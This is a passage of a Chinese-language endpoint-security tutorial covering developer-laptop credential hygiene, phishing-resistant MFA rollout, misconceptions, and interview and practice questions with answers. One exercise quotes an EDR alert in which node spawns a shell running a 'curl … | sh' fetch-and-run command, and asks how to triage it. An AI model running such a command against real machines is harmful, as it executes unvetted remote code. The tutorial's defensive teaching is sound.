<tr><td>之後幾天</td><td>查日誌：遺失時間點之後，這些憑證有沒有被用過；寫一份短短的事件紀錄</td></tr>
</table>
<p>最重要的不是技術，而是<b>員工願意在一小時內通報</b>。只要通報後會被責罵或扣錢，大家就會先自己找三天。規則要寫清楚：馬上通報不會受罰，隱瞞才會。</p>

<h3><span class="badge lv4">專家</span>九、開發者的筆電：攻擊者最想要的那一台</h3>
<p>一般員工的筆電被入侵，損失是他的信箱；開發者的筆電被入侵，損失可能是正式環境。回到第一張圖，把每一把鑰匙改成短效、加鎖、或乾脆不放在磁碟上。</p>
<h4>SSH 金鑰</h4>
<ul>
<li>用 <code>ssh-keygen -t ed25519</code> 產生，<b>一定要設通行密語</b>，再交給 <code>ssh-agent</code>（macOS 可以存進鑰匙圈），不用每次輸入。沒有通行密語的私鑰，任何以你身分執行的程式讀走就能用。</li>
<li>更好的是放在硬體裡：<code>ssh-keygen -t ed25519-sk</code> 會把金鑰綁在 FIDO2 安全金鑰上（需要 OpenSSH 8.2 以上），每次使用都要實體觸碰，私鑰根本不在磁碟上。</li>
<li>小心 <code>ForwardAgent yes</code>：你連上的那台主機上，任何有 root 權限的人都能借用你的 agent 去連別台。需要跳板就用 <code>ProxyJump</code>。</li>
</ul>
<h4>雲端憑證</h4>
<p>最常見的災難是 <code>~/.aws/credentials</code> 裡躺著一組永久存取金鑰，權限是管理員。改用 SSO 換短效憑證：</p>
<pre><code>aws configure sso          # 設定一次：IdP 的網址、帳號、角色
aws sso login --profile dev  # 每天早上：瀏覽器登入公司 IdP
aws s3 ls --profile dev      # 拿到的是幾小時就過期的憑證</code></pre>
<p>就算這些快取的憑證被偷，幾小時後也就失效了。GCP 的 <code>gcloud auth login</code>、Azure 的 <code>az login</code> 都是同樣的思路。Kubernetes 的 kubeconfig 也一樣，用 exec 外掛向雲端或 OIDC 即時換 token，不要放一個永久有效的服務帳號 token。</p>
<h4>shell 裡的祕密</h4>
<ul>
<li><code>export API_TOKEN=…</code> 打在命令列上，會留在 <code>~/.zsh_history</code>。zsh 可以 <code>setopt HIST_IGNORE_SPACE</code>，指令前面加一個空白就不記錄；bash 是 <code>HISTCONTROL=ignorespace</code>。</li>
<li>寫在 <code>~/.zshrc</code> 的環境變數，會被你開的<b>每一個</b>程式繼承，包括你剛 <code>npm install</code> 的那四百個套件。Linux 上同一個使用者的行程，還能從 <code>/proc/&lt;pid&gt;/environ</code> 讀到彼此的環境變數。</li>
<li>改成執行時才注入：密碼管理器的 CLI（例如 1Password 的 <code>op run</code>）只把祕密交給那一次執行的程式。</li>
<li><code>git config credential.helper store</code> 會把 token 以明文存在 <code>~/.git-credentials</code>，改用 macOS 的 <code>osxkeychain</code>。</li>
</ul>
<h4>你自己裝的東西</h4>
<p>npm 套件的 <code>postinstall</code> 腳本、VS Code 擴充套件、一個 Homebrew 公式，跑起來都擁有你全部的權限，看得到上面每一把鑰匙。幾個習慣：CI 和不熟的專案用 <code>npm ci --ignore-scripts</code>；把 <code>/var/run/docker.sock</code> 當成 root 權限看待，不要掛進不信任的容器；不同客戶、不同風險的專案，分到不同的使用者帳號、虛擬機或開發容器裡。</p>

<h3><span class="badge lv4">專家</span>十、在全公司導入防釣魚的 MFA</h3>
<p>上一章說，只有通行金鑰、安全金鑰這類防釣魚的 MFA，擋得住中間人釣魚。知道是一回事，讓 200 個人全部換掉又是另一回事。一個實際可行的順序：</p>
<ol>
<li><b>管理員先</b>：每位管理員兩把 FIDO2 安全金鑰（一把隨身、一把鎖在公司），條件式存取對管理員角色要求「防釣魚的驗證強度」。人少、風險最高，最該先做。</li>
<li><b>工程師、財務、人資</b>：碰得到正式環境、錢、個資的人。可以用安全金鑰，也可以用平台內建的驗證器：Windows Hello for Business、macOS 的 Platform SSO，把金鑰放在筆電的安全晶片裡，用指紋或 PIN 解鎖。</li>
<li><b>全公司</b>：手機上的通行金鑰。這一步的重點是註冊流程：用上一章的一次性設定碼，讓新人第一天就直接註冊通行金鑰，從來沒有密碼加簡訊這個階段。</li>
<li><b>關掉弱的方式</b>：註冊率到了九成以上，再把簡訊、語音電話這些方式從允許清單拿掉。只要弱的方式還在，攻擊者就會把使用者「降級」到它。</li>
</ol>
<p>兩個常被問的取捨。<b>同步的通行金鑰</b>（存在 iCloud 鑰匙圈或 Google 密碼管理工具，換手機會跟著走）很方便，但金鑰離開了單一裝置，安全性取決於那個雲端帳號；<b>綁裝置的</b>（安全金鑰、平台驗證器）更強，換機時要重新註冊。常見的做法是管理員一律綁裝置，一般員工允許同步。另一個是<b>遺失時怎麼辦</b>：每個人至少註冊兩個方法，服務台照上一章的流程確認身分後，發一次性設定碼重新註冊，絕不臨時開放簡訊。</p>
<p>要追的數字只有一個：「只能用防釣魚方式登入的帳號比例」。不是「有註冊過」的比例，因為還留著簡訊的帳號，等於沒換。</p>

<h3>十一、常見誤解</h3>
<table>
<tr><th>誤解</th><th>實際上</th></tr>
<tr><td>磁碟有加密，筆電被偷就沒事</td><td>只對關機狀態有效。開著、睡眠中的機器靠的是螢幕鎖；惡意程式則完全不受加密影響。</td></tr>
<tr><td>有 MDM 就能遠端清除，憑證不用換</td><td>清除要等機器開機上網才會執行，可能永遠不會。可能被複製走的憑證一定要撤銷。</td></tr>
<tr><td>MDM 會監看員工在做什麼</td><td>MDM 管的是設定和清冊。真正看得到行程和連線的是 EDR，而且公司應該明文告訴員工收集了什麼。</td></tr>
<tr><td>Mac 不用 EDR</td><td>資訊竊取程式大量針對 macOS，尤其是假的開發工具和破解軟體。</td></tr>
<tr><td>工程師需要管理員權限才能工作</td><td>大多數開發工作不需要。需要時用有時限的提權工具，用完收回。</td></tr>
<tr><td>開了 MFA 就完成了</td><td>只要簡訊、推播這些方式還能用，攻擊者就會選它們。要關掉弱的方式才算完成。</td></tr>
</table>

<h3>十二、跟你的工作連起來</h3>
<ul>
<li><b>Node.js、前端專案</b>：一個 <code>npm install</code> 會執行幾百個陌生人寫的腳本，它們看得到你的 <code>~/.aws</code> 和 <code>~/.ssh</code>。這就是為什麼要用短效憑證、為什麼 <code>.env</code> 不該躺著正式環境的密碼。</li>
<li><b>Docker</b>：能存取 Docker socket 的程式，等於本機 root。開發容器（dev container）很好用，但不要把整個家目錄掛進去。</li>
<li><b>Go、雲端伺服器</b>：把「雲端憑證幾小時就過期」當成前提設計工具和腳本，CI 用 OIDC 換憑證，本機用 SSO。</li>
<li><b>Cocos、Unity</b>：遊戲引擎、外掛和素材包都是執行檔或腳本，來路要清楚；破解版素材工具是資訊竊取程式最常見的包裝之一。</li>
<li><b>給團隊的筆電</b>：如果你是小團隊裡懂技術的那個人，本章的順序就是你的待辦：加密並託管金鑰、自動更新加期限、EDR、密碼管理器、管理員改用安全金鑰。</li>
</ul>

<h3>十三、面試會怎麼問</h3>
<p>先自己講一遍，再打開參考答案。</p>
<ol>
<li>「一位工程師的筆電在高鐵上遺失了，請說明你接下來兩小時的處理步驟。」</li>
<li>「全碟加密能防什麼、不能防什麼？復原金鑰應該怎麼管？」</li>
<li>「EDR 跟傳統防毒有什麼不同？它在一台機器上收集哪些資料？」</li>
<li>「你會怎麼設計公司筆電的更新政策，兼顧穩定和安全？」</li>
<li>「怎麼讓只有公司管理、而且狀態健康的裝置，才能存取雲端主控台？」</li>
</ol>
<details class="reveal"><summary>看參考答案</summary>
<ol>
<li>先從 MDM 遠端鎖定、在 IdP 撤銷該員所有工作階段、將裝置標為不信任。接著確認遺失時是否關機、是否加密，並依資產清冊與該員的權限列出機器上可能存在的憑證：SSH 金鑰、雲端存取金鑰、程式碼代管 token、VPN 憑證、kubeconfig，逐一撤銷或輪替。確定找不回就遠端清除，保留 Activation Lock。最後查日誌，確認遺失後這些憑證有沒有被使用，並留下事件紀錄。重點是：清除不保證會執行，所以輪替才是真正的保障。</li>
<li>它防的是關機狀態下的實體竊取，讓磁碟拆下來或開機也讀不到資料。它不防登入後的惡意程式，也不防已解鎖或睡眠中的機器被操作。復原金鑰應在開啟加密時由 MDM 自動託管，只有通過身分確認的服務台人員能查看，查看會留紀錄，用過一次就輪替。</li>
<li>傳統防毒主要比對已知惡意檔案的特徵，在檔案進來時擋。EDR 持續記錄行程建立與命令列、父子關係、檔案變動、網路連線、持久化機制和登入事件，送到中央分析，用行為規則、模型和威脅情報找出可疑的行為序列，並提供遠端回應，例如結束行程、隔離檔案、把機器網路隔離。它也是事後調查時「發生了什麼」的主要資料來源。</li>
<li>分組推送：MIS 與自願者組成測試組先裝，沒問題再擴大到先行組，最後全公司。每一組都有可自選安裝時間的期間和強制期限，期限到就自動安裝並重開。正在被利用的漏洞不走分組，所有人限期一兩天內完成。範圍包含作業系統、瀏覽器和常用軟體，並用清冊報表追蹤「幾天內有幾成裝置到達最新版」，無法升級的舊機器排入汰換。</li>
<li>所有公司裝置透過零接觸部署註冊到 MDM，MDM 依合規政策檢查系統版本、加密、防火牆、EDR、螢幕鎖等項目，並把合規狀態同步給身分提供者。條件式存取對雲端主控台設定「要求合規裝置」，必要時再加上防釣魚的驗證強度。裝置的身分由註冊時存在 TPM 或 Secure Enclave 裡的金鑰證明，避免被偽造。新政策先用僅限報告模式觀察，並排除緊急帳號。</li>
</ol>
</details>

<h3>十四、練功題（做得出來才算真的懂）</h3>
<ol>
<li>在你的 Mac 上確認三件事：磁碟有沒有加密、這台機器有沒有被 MDM 管理、防火牆有沒有開。各要用什麼指令？</li>
<li>列出你筆電上所有「純文字存放的憑證」：在家目錄裡找 <code>.env</code> 檔、<code>~/.aws/credentials</code>、<code>~/.git-credentials</code>、沒有通行密語的 SSH 私鑰。每找到一個，寫下它能打開哪扇門，以及要換成什麼方式。</li>
<li>公司規定「macOS 安全性更新落後 14 天以上就不合規，寬限 3 天」。一位設計師出國兩週，筆電一直沒開機，回國第一天早上開機要開會。會發生什麼事？政策該怎麼設計才不會讓她卡一整天？</li>
<li>EDR 跳出一個警示：<code>node</code> 啟動了 <code>sh</code>，<code>sh</code> 執行 <code>curl … | sh</code>。這一定是攻擊嗎？你會再看哪些資訊來判斷？</li>
<li>替一家 40 人的公司寫出防釣魚 MFA 的導入計畫，分成三個月，每個月寫出要完成的事和要追的數字。</li>
</ol>
<details class="reveal"><summary>看答案</summary>
<ol>
<li><code>fdesetup status</code>（看 FileVault 是否開啟）；<code>profiles status -type enrollment</code>（看有沒有註冊 MDM、是不是零接觸部署）；<code>/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate</code>（看應用程式防火牆）。</li>
<li>例如：<code>~/.aws/credentials</code> 的永久金鑰 → 雲端帳號，改用 <code>aws configure sso</code>；<code>~/.git-credentials</code> → 程式碼代管，改用 <code>osxkeychain</code>；沒有通行密語的 <code>id_ed25519</code> → 伺服器與 Git，用 <code>ssh-keygen -p -f ~/.ssh/id_ed25519</code> 加上通行密語，或改用 <code>ed25519-sk</code>；專案的 <code>.env</code> → 資料庫，正式環境的密碼移到密碼管理器，用 <code>op run</code> 這類方式注入。找檔案可以用 <code>find ~ -name '.env' -not -path '*/node_modules/*' 2&gt;/dev/null</code>。</li>
<li>開機時她早就超過 14 天加 3 天寬限，筆電一回報就被判不合規，要求合規裝置的應用程式全部進不去，而大型更新加重開可能要半小時以上。改善：寬限期從「裝置第一次回報落後」開始算，而不是從更新發布日算；會議、信箱這類不要求合規，只有高風險系統才要求；不合規的畫面直接給「立即更新」的按鈕和預估時間。</li>
<li>不一定。前端建置腳本、套件安裝腳本常做這種事。要看：是哪個專案、哪個套件觸發的（父行程的完整命令列和工作目錄）；curl 的網址是不是官方來源、是不是剛註冊的網域；下載的腳本接著做了什麼（有沒有讀瀏覽器資料、SSH 金鑰，有沒有建立持久化）；同一時間其他機器有沒有一樣的事件。若是新版套件突然出現這個行為，要懷疑供應鏈攻擊。</li>
<li>第一個月：所有管理員兩把安全金鑰，條件式存取對管理員要求防釣魚強度；追「管理員防釣魚覆蓋率 100%」。第二個月：工程與財務改用平台驗證器或安全金鑰，服務台的身分確認與重新註冊流程上線；追這兩群人的覆蓋率。第三個月：全公司註冊通行金鑰，新人流程改成第一天直接註冊；覆蓋率超過九成後關閉簡訊與語音；追「只能用防釣魚方式登入的帳號比例」和服務台重設次數。</li>
</ol>
</details>

<h3>十五、想再挖深</h3>
<ul>
<li><b>Apple Platform Security</b> 與 <b>Apple Platform Deployment</b>（<a href="https://support.apple.com/guide/security/welcome/web">support.apple.com/guide/security</a>）：FileVault、Secure Enclave、MDM、零接觸部署的官方說明。</li>
<li><b>Microsoft Intune 文件</b>（<a href="https://learn.microsoft.com/intune/">learn.microsoft.com/intune</a>）：合規政策、應用程式保護政策、Windows 更新組的設計。</li>
<li><b>CIS Benchmarks</b>（<a href="https://www.cisecurity.org/cis-benchmarks">cisecurity.org</a>）：macOS、Windows、瀏覽器的逐項加固建議，很多 MDM 有現成範本。</li>
<li><b>macOS Security Compliance Project</b>（<a href="https://github.com/usnistgov/macos_security">github.com/usnistgov/macos_security</a>）：NIST 參與維護，能把安全基準直接產生成 MDM 設定描述檔。</li>
<li><b>FIDO Alliance 的通行金鑰說明</b>（<a href="https://fidoalliance.org/passkeys/">fidoalliance.org/passkeys</a>）：同步與綁裝置通行金鑰的差異、企業導入指引。</li>
</ul>
` });
